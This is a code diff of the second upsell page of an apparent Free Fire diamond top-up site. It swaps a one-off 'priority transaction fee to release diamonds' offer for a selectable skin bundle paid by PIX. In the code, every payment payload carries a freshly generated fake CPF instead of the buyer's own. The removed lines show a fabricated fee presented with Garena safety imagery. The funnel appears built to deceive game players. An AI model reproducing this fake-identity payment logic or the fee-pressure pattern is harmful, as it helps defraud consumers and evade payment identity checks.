@@ -1,15 +1,15 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect, useMemo } from 'react';
 import { useRouter } from 'next/navigation';
 import Image from 'next/image';
 import { Button } from '@/components/ui/button';
 import { Header } from '@/components/freefire/Header';
 import { Footer } from '@/components/freefire/Footer';
+import { Checkbox } from '@/components/ui/checkbox';
 import { cn } from '@/lib/utils';
-import { taxOffer } from '@/lib/data';
+import { skinOffers } from '@/lib/data';
 import { useToast } from '@/hooks/use-toast';
-import { CheckCircle } from 'lucide-react';
 import { PaymentPayload } from '@/interfaces/types';
 import { gerarCPFValido } from '@/lib/utils';
 
@@ -23,29 +23,44 @@ interface CustomerData {
 const Upsell2Page = () => {
     const router = useRouter();
     const { toast } = useToast();
-    const [selectedOfferId] = useState<string | null>(taxOffer[0]?.id || null);
+    const [selectedSkins, setSelectedSkins] = useState<string[]>([]);
     const [isSubmitting, setIsSubmitting] = useState(false);
 
     const handleDecline = () => {
-        // Limpa os dados do cliente se ele recusar a oferta final
+        // Limpa os dados do cliente se ele recusar a oferta final, pois o fluxo termina aqui.
         localStorage.removeItem('customerData');
         router.push('/success');
     };
+    
+    const handleSkinSelection = (skinId: string) => {
+        setSelectedSkins(prev => 
+            prev.includes(skinId) 
+                ? prev.filter(id => id !== skinId)
+                : [...prev, skinId]
+        );
+    };
+
+    const totalAmount = useMemo(() => {
+        const selectedCount = selectedSkins.length;
+        if (selectedCount === 0) return 'R$ 0,00';
+        const pricePerSkin = 9.90;
+        return (selectedCount * pricePerSkin).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+    }, [selectedSkins]);
 
     const handlePurchase = async () => {
-        if (!selectedOfferId) {
+        if (selectedSkins.length === 0) {
             toast({
                 variant: 'destructive',
-                title: 'Erro',
-                description: 'Nenhuma taxa selecionada.',
+                title: 'Nenhuma skin selecionada',
+                description: 'Por favor, selecione pelo menos uma skin para continuar.',
             });
             return;
         }
 
         setIsSubmitting(true);
 
-        const selectedProduct = taxOffer.find(p => p.id === selectedOfferId);
-        if (!selectedProduct) {
+        const selectedProducts = skinOffers.filter(p => selectedSkins.includes(p.id));
+        if (selectedProducts.length === 0) {
             setIsSubmitting(false);
             return;
         }
@@ -69,21 +84,25 @@ const Upsell2Page = () => {
             const utmQuery = new URLSearchParams(window.location.search).toString();
             const currentBaseUrl = window.location.origin;
 
+            const payloadItems = selectedProducts.map(p => ({
+                id: p.id,
+                title: p.name,
+                unitPrice: parseFloat(p.price),
+                quantity: 1,
+                tangible: false,
+            }));
+
+            const totalNumericAmount = selectedProducts.reduce((sum, p) => sum + parseFloat(p.price), 0);
+
             const payload: PaymentPayload = {
                 name: customerData.name,
                 email: customerData.email,
                 phone: customerData.phone.replace(/\D/g, ''),
-                cpf: gerarCPFValido().replace(/\D/g, ''), // Gera um novo CPF para a transação
+                cpf: gerarCPFValido().replace(/\D/g, ''),
                 paymentMethod: "PIX",
-                amount: parseFloat(selectedProduct.price),
-                externalId: `ff-upsell2-${Date.now()}`,
-                items: [{
-                    id: selectedProduct.id,
-                    title: selectedProduct.name,
-                    unitPrice: parseFloat(selectedProduct.price),
-                    quantity: 1,
-                    tangible: false
-                }],
+                amount: totalNumericAmount,
+                externalId: `ff-upsell2-skins-${Date.now()}`,
+                items: payloadItems,
                 postbackUrl: `${currentBaseUrl}/api/ghostpay-webhook`,
                 utmQuery,
                 traceable: true,
@@ -98,20 +117,20 @@ const Upsell2Page = () => {
             const data = await response.json();
 
             if (!response.ok) {
-                throw new Error(data.message || "Erro ao criar o pagamento para a taxa.");
+                throw new Error(data.message || "Erro ao criar o pagamento para as skins.");
             }
 
             // Salva os dados de pagamento da taxa
             localStorage.setItem('paymentData', JSON.stringify({
                 ...data,
                 playerName: playerName,
-                productDescription: selectedProduct.name,
-                amount: selectedProduct.formattedPrice,
-                diamonds: selectedProduct.totalAmount,
-                originalAmount: selectedProduct.originalAmount,
-                bonusAmount: selectedProduct.bonusAmount,
-                totalAmount: selectedProduct.totalAmount,
-                productId: selectedProduct.id,
+                productDescription: selectedProducts.map(p => p.name).join(', '),
+                amount: totalAmount,
+                diamonds: 'Skins Especiais', // Placeholder
+                originalAmount: '',
+                bonusAmount: '',
+                totalAmount: 'Skins',
+                productId: 'skins-upsell', // ID genérico para esta etapa
             }));
             
             // Limpa os dados do cliente pois este é o final do fluxo
@@ -134,42 +153,59 @@ const Upsell2Page = () => {
             <Header />
             <main className="flex-1 flex flex-col items-center justify-center p-4 text-center">
                 <div className="bg-white rounded-2xl shadow-lg p-6 md:p-10 max-w-lg w-full border">
-                    <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
                     <h1 className="text-2xl md:text-3xl font-bold text-gray-800 uppercase tracking-wider">
-                        Liberação Imediata
+                        Oferta Exclusiva de Skins
                     </h1>
                     <p className="mt-3 text-base text-gray-600">
-                        Para garantir a entrega imediata e segura dos seus diamantes, é necessário o pagamento de uma pequena taxa de transação prioritária.
+                        Sua compra foi um sucesso! Que tal adicionar estas skins raras à sua coleção por um preço especial?
                     </p>
                     
-                    <div className="flex flex-col gap-4 my-8">
-                        {taxOffer.map(offer => (
-                            <div
+                    <div className="flex flex-col gap-3 my-8">
+                        {skinOffers.map(offer => (
+                             <div
                                 key={offer.id}
+                                onClick={() => handleSkinSelection(offer.id)}
                                 className={cn(
-                                    "p-4 rounded-lg border-2 cursor-default transition-all duration-200 text-left flex items-center gap-4",
-                                    'border-destructive bg-destructive/5'
+                                    "p-3 rounded-lg border-2 cursor-pointer transition-all duration-200 text-left flex items-center gap-4",
+                                    selectedSkins.includes(offer.id) ? 'border-destructive bg-destructive/5' : 'border-gray-200 bg-white hover:border-gray-300'
                                 )}
                             >
-                                <div className="flex-shrink-0">
-                                    <Image src="https://cdn-gop.garenanow.com/gop/mshop/www/live/assets/ic-safety-919638c4.png" alt="Taxa" width={40} height={40} data-ai-hint="shield" />
+                                <div className="flex-shrink-0 w-16 h-16 rounded-md overflow-hidden">
+                                    <Image 
+                                        src={offer.image} 
+                                        alt={offer.name} 
+                                        width={64} 
+                                        height={64} 
+                                        className="object-cover w-full h-full"
+                                        data-ai-hint="character skin" 
+                                    />
                                 </div>
-                                <div>
-                                    <h2 className="text-lg font-bold text-gray-800">{offer.name}</h2>
-                                    <p className="text-2xl font-extrabold text-gray-900">{offer.formattedPrice}</p>
+                                <div className="flex-1">
+                                    <h2 className="text-base font-bold text-gray-800">{offer.name}</h2>
+                                    <p className="text-lg font-extrabold text-gray-900">{offer.formattedPrice}</p>
                                 </div>
+                                <Checkbox
+                                    checked={selectedSkins.includes(offer.id)}
+                                    onCheckedChange={() => handleSkinSelection(offer.id)}
+                                    className="h-6 w-6"
+                                />
                             </div>
                         ))}
+                    </div>
+
+                    <div className="flex justify-between items-center font-bold text-xl my-6">
+                        <span>Total:</span>
+                        <span>{totalAmount}</span>
                     </div>
 
                     <div className="flex flex-col gap-3">
                         <Button
                             onClick={handlePurchase}
-                            disabled={!selectedOfferId || isSubmitting}
+                            disabled={isSubmitting || selectedSkins.length === 0}
                             className="w-full text-lg py-6 font-bold"
                             variant="destructive"
                         >
-                            {isSubmitting ? 'Processando...' : 'Pagar Taxa e Liberar Diamantes'}
+                            {isSubmitting ? 'Processando...' : `Adicionar e Pagar ${totalAmount}`}
                         </Button>
                         <Button
                             onClick={handleDecline}
